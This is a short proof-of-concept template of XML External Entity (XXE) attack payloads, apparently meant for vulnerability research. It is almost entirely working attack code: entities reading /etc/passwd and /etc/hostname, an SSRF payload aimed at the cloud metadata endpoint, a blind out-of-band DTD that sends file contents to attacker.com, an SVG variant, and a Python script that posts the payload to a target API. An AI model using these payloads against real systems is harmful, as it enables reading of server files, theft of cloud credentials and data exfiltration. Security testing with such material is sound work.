# PoC Skeleton -- XXE

## File Read XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

## SSRF XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

## Blind XXE (Out-of-Band Exfiltration)

### Step 1: Host evil.dtd on attacker server
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Step 2: Send payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

## SVG XXE

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## Python PoC

```python
#!/usr/bin/env python3
"""
CVE-CANDIDATE: XXE in [package-name]
CWE: CWE-611 (Improper Restriction of XML External Entity Reference)
CVSS: 7.5 HIGH
"""
import requests

xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>"""

response = requests.post(
    'http://target/api/parse',
    data=xxe_payload,
    headers={'Content-Type': 'application/xml'}
)
print(f'[+] Response: {response.text}')
```
